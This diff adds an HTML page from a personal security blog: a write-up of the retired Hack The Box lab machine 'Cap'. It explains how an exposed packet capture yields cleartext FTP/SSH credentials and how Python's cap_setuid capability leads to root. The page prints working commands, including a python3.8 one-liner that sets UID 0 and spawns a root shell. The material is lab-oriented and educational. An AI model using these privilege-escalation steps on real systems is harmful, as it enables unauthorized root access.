@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Cap | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Network Forensics</p>
+      <h1>HTB Cap</h1>
+      <p class="headline">IDOR-exposed packet capture, credential recovery and Python capabilities abuse</p>
+      <p class="meta">Retired - Root / Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Cap exposes downloadable packet captures through predictable IDs. Although the UI starts at capture <code>1</code>, capture <code>0</code> exists and contains cleartext credentials.</p>
+<h2>Initial Access</h2>
+<p>The PCAP is downloaded and decoded with <code>tshark</code> and <code>xxd</code>, revealing credentials that work over FTP and SSH for the <code>nathan</code> user.</p>
+<h2>Privilege Escalation</h2>
+<p>Linux capabilities show that <code>python3.8</code> has <code>cap_setuid</code>. Using Python to set UID 0 and spawn <code>/bin/bash</code> gives a root shell.</p>
+<h2>Key Commands</h2>
+<pre><code class="language-bash">tshark -r 0.pcap -Tfields -e tcp.payload 2&gt;/dev/null | xxd -ps -r</code></pre>
+<pre><code class="language-bash">ssh nathan@cap.htb</code></pre>
+<pre><code class="language-bash">getcap -r / 2&gt;/dev/null</code></pre>
+<pre><code class="language-bash">python3.8 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</code></pre>
+<h2>Evidence Trail</h2>
+<p>The following screenshots preserve the original lab evidence sequence from the Obsidian notes.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026180345.png" alt="cap evidence 01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026180603.png" alt="cap evidence 02" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026182427.png" alt="cap evidence 03" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026182553.png" alt="cap evidence 04" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026183025.png" alt="cap evidence 05" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026183148.png" alt="cap evidence 06" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026183352.png" alt="cap evidence 07" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026183659.png" alt="cap evidence 08" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026184432.png" alt="cap evidence 09" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026184542.png" alt="cap evidence 10" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026184747.png" alt="cap evidence 11" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026185037.png" alt="cap evidence 12" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/cap/Pasted%20image%2020241026185144.png" alt="cap evidence 13" /></figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
